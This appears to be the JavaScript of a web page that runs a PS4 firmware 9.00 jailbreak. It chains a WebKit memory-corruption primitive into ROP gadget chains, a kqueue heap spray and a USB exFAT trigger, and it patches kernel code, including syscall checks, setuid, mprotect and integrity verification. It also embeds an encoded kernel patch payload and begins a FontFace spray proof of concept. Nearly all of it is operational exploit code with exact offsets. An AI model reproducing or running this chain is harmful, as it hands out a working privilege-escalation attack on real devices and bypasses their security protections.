            this.push(gadgets["pop r9"]);
            this.push(r9);
        }

        if (this.stack.add32(this.count * 0x8).low & 0x8) {
            this.push(gadgets["ret"]);
        }

        this.push(rip);
        return this;
    }

    this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
        this.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
        this.write_result(this.retval);
        this.run();
        return p.read8(this.retval);
    }

    this.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
        return this.call(window.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
    }

    //get rsp of the next push
    this.get_rsp = function () {
        return this.stack.add32(this.count * 8);
    }
    this.write_result = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], rax"]);
    }
    this.write_result4 = function (where) {
        this.push(gadgets["pop rdi"]);
        this.push(where);
        this.push(gadgets["mov [rdi], eax"]);
    }

    this.jmp_rsp = function (rsp) {
        this.push(window.gadgets["pop rsp"]);
        this.push(rsp);
    }

    this.run = function () {
        p.launch_chain(this);
        this.clear();
    }

    this.KERNEL_BASE_PTR_VAR;
    this.set_kernel_var = function (arg) {
        this.KERNEL_BASE_PTR_VAR = arg;
    }

    this.rax_kernel = function (offset) {
        this.push(gadgets["pop rax"]);
        this.push(this.KERNEL_BASE_PTR_VAR)
        this.push(gadgets["mov rax, [rax]"]);
        this.push(gadgets["pop rsi"]);
        this.push(offset)
        this.push(gadgets["add rax, rsi"]);
    }

    this.write_kernel_addr_to_chain_later = function (offset) {
        this.push(gadgets["pop rdi"]);
        var idx = this.pushSymbolic();
        this.rax_kernel(offset);
        this.push(gadgets["mov [rdi], rax"]);
        return idx;
    }

    this.kwrite8 = function (offset, qword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rsi"]);
        this.push(qword);
        this.push(gadgets["mov [rax], rsi"]);
    }

    this.kwrite4 = function (offset, dword) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rdx"]);
        this.push(dword);
        this.push(gadgets["mov [rax], edx"]);
    }

    this.kwrite2 = function (offset, word) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(word);
        this.push(gadgets["mov [rax], cx"]);
    }

    this.kwrite1 = function (offset, byte) {
        this.rax_kernel(offset);
        this.push(gadgets["pop rcx"]);
        this.push(byte);
        this.push(gadgets["mov [rax], cl"]);
    }

    this.kwrite8_kaddr = function (offset1, offset2) {
        this.rax_kernel(offset2);
        this.push(gadgets["mov rdx, rax"]);
        this.rax_kernel(offset1);
        this.push(gadgets["mov [rax], rdx"]);
    }
    return this;
};
</script>
<script>
var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;

var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;

const OFFSET_WKR_psl_builtin = 0x33BA0;

const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;

const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;


const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF,

    "mov [rax], cl": 0xC6EAF,
};

var wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};

var wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
    "mov [rax], cx": 0x15A7D52,
};
var hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
var ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

function userland() {

    //RW -> ROP method is strongly based off of:
    //https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit

    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    //pointer to vtable address
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    var textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (var gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        var str = "";
        for (var i = 0;; i++) {
            var c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;

    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();

    //Sanity check
    if (chain.syscall(20).low == 0) {
        alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
        while (1);
    }
}


function run_hax() {
    userland();
    if (chain.syscall(23, 0).low != 0x0) {
       kernel();
       //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
    }
    else
    {
       showMessage("Loading Payload...");
       setTimeout(injectPayload, 3000);
    }
}


function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    trigger_spray();
}

var handle;
var random_path;
var ex_info;

function load_prx(name) {
    //sys_dynlib_load_prx
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    //sys_dynlib_get_info_ex
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
    }
    return tlsinit;
}

//Obtain extra gadgets through module loading
function extra_gadgets() {
    handle = p.malloc(0x1E8);
    var randomized_path_length_ptr = handle.add32(0x4);
    var randomized_path_ptr = handle.add32(0x14);
    ex_info = randomized_path_ptr.add32(0x40);

    p.write8(randomized_path_length_ptr, 0x2C);
    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
    random_path = p.readstr(randomized_path_ptr);

    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");

    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
        //Ensure all gadgets are available to kernel.
        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
    }
    chain.run();
}

//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
function kchain_setup() {
    const KERNEL_busy = 0x1B28DF8;

    const KERNEL_bcopy = 0xACD;
    const KERNEL_bzero = 0x2713FD;
    const KERNEL_pagezero = 0x271441;
    const KERNEL_memcpy = 0x2714BD;
    const KERNEL_pagecopy = 0x271501;
    const KERNEL_copyin = 0x2716AD;
    const KERNEL_copyinstr = 0x271B5D;
    const KERNEL_copystr = 0x271C2D;
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;
    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap_1 = 0x16632A;
    const KERNEL_mmap_2 = 0x16632D;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    //negative offset of kqueue string to kernel base
    //0xFFFFFFFFFF86B593 0x505
    //0xFFFFFFFFFF80E364 0x900
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();
    //Ensure the krop stack remains available.
    {
        chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
        chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
        chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
    }
    chain.run();

    kchain.count = 0;
    kchain2.count = 0;

    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);

    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);

    //Sorry we're closed
    kchain.kwrite1(KERNEL_busy, 0x1);
    kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.


    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    //Modify UD
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);


    //Initial patch(es)
    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
    //might as well do the others
    kchain2.kwrite1(KERNEL_bzero, 0xEB);
    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
    kchain2.kwrite1(KERNEL_copyin, 0xEB);
    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
    kchain2.kwrite1(KERNEL_copystr, 0xEB);

    //I guess you're not all that bad...
    kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again

    //Restore original UD
    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    //Apply kernel patches    
    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    //patch in reverse because /shrug
    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);

    kchain2.kwrite1(KERNEL_setuid, 0xEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite2(KERNEL_prx, 0xE990);
    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);

    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
    kchain2.kwrite1(KERNEL_mmap_2, 0x37);

    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    //Restore CR0
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);

    //Recover
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    //Map fake object
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    //setup fake object
    //KNOTE
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    //FILTOPS
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
    }
    //OBJ
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    }
    //Ensure the fake knote remains available
    chain.syscall(203, fake_knote, 0xC000);
}

var trigger_spray = function () {

    var NUM_KQUEUES = 0x1B0;
    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    //Make kqueues
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueue_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

    var that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("invalid socket");
        while (1);
    }

    //Spray kevents
    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0);
    //
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
        }
    }
    chain.run();

    //Fragment memory
    {
        for (var i = 18; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    //Trigger OOB

    alert("Insert The USB Drive And Click OK When You See The Popup Notification");
    showMessage("Loading ExFatHax...");


    sleep(3000).then(() => {
   
        //Trigger corrupt knote
        {
        for (var i = 1; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
        }
        chain.run();

        if (chain.syscall(23, 0).low == 0) {
			
            //cleanup fake knote & release locked gadgets/stack.
            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
            chain.fcall(window.syscalls[325]);
            chain.run();
			
            //This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
            var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
            var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
            var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
            for(var i=0; i < PatchPl.length; i++)
            {
              patch_buffer_view[i] = PatchPl[i];
            }
            chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
            chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
            chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
            chain.run();

            showMessage("Loading Payload...<br>Remove the USB Drive.");
            setTimeout(injectPayload, 3000);
        }
        else
        {
            alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
            p.write8(0, 0);
        }
    });
}
</script>
<script>
var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x100a;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time

function poc() {

    var union = new ArrayBuffer(8);
    var union_b = new Uint8Array(union);
    var union_i = new Uint32Array(union);
    var union_f = new Float64Array(union);

    var bad_fonts = [];

    for (var i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    var good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    var arrays = [];
    for (var i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    var jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    var string_atomifier = {};
    var string_id = 10000000;

    function ptrToString(p) {
        var s = '';
        for (var i = 0; i < 8; i++) {
            s += String.fromCharCode(p % 256);
            p = (p - p % 256) / 256;
        }
        return s;
    }

    function stringToPtr(p, o) {
        if (o === undefined)
            o = 0;
        var ans = 0;
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + p.charCodeAt(o + i);
        return ans;
    }

